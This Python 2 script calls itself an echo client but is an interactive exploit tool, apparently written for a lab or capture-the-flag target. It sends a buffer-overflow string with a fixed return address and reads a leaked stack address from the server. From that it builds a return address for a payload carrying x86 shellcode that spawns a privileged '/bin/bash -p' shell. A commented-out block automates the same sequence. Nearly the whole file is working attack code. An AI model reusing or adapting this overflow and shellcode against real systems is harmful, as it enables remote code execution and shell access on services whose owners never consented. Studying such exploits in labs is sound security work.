# Echo client program
import socket
import sys
import select

if len(sys.argv) < 3:
	sys.exit("usage:python3 client.py <IP> <Port>")

host = str(sys.argv[1]) 	# The remote host

try:
	port = int(sys.argv[2])	# The same port as used by the server
except ValueError:
	sys.stderr.write("[ERROR] ValueError\n")
	sys.exit(1)

#print "host = {0}, port = {1}".format(host,port)

try:
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
except socket.error:
	sys.stderr.write("[ERROR] socket error\n")
	sys.exit(1)

try:
	sock.connect((host,port))
except socket.error:
	sys.stderr.write("[ERROR] connect error\n")
	sys.exit(1)

auto = ""

while True:
	auto = raw_input("auto or not?[Y/N]")
	if auto == 'Y':
		auto = True
		break;
	elif auto == 'N':
		auto = False
		break;
	else:
		continue

cmd = ""
ret_addr = ""
count = 0

while True:
	rlist,wlist,elist = select.select([sys.stdin,sock],[],[])
	if sys.stdin in rlist:
		cmd = raw_input()
		if cmd == 'A':
			send_buff = '16'
		elif cmd == 'B':
			send_buff = 'AAAAAAAABCDEFGHIJKLMNOPQRS\x7a\x89\x04\x08'
		elif cmd == 'C':
			send_buff = 'A\0AAAAAABCDEFGHI'+ret_addr+'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
		elif cmd == 'exit':
			break;
		else:
			send_buff = cmd
		sock.send(send_buff+"\n")
		#print (send_buff)
	elif sock in rlist:
		recv_buff = sock.recv(1024)
		"""
		if auto == True:
			if count == 0:
				send_buff = '16'
			elif count == 1:
				send_buff = 'AAAAAAAABCDEFGHIJKLMNOPQRS\x7a\x89\x04\x08'
			elif count == 2:
				send_buff = '2'
			elif count == 3:
				send_buff = '3'
			elif count == 4:
				send_buff = 'A\0AAAAAABCDEFGHI'+ret_addr+'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
			if count < 4:
				sock.send(send_buff+"\n")
			count += 1
		"""
		if cmd == '2':
			buf_addr = recv_buff.split(':')[1].split('\n')
			tmp = int(buf_addr[0],16)+20
			ret_addr += chr(int(hex(tmp)[8:10],16))+chr(int(hex(tmp)[6:8],16))+chr(int(hex(tmp)[4:6],16))+chr(int(hex(tmp)[2:4],16))
			#print hex(tmp)[8:10]+hex(tmp)[6:8]+hex(tmp)[4:6]+hex(tmp)[2:4]
		if recv_buff is not None:
			print (recv_buff)

sock.close()
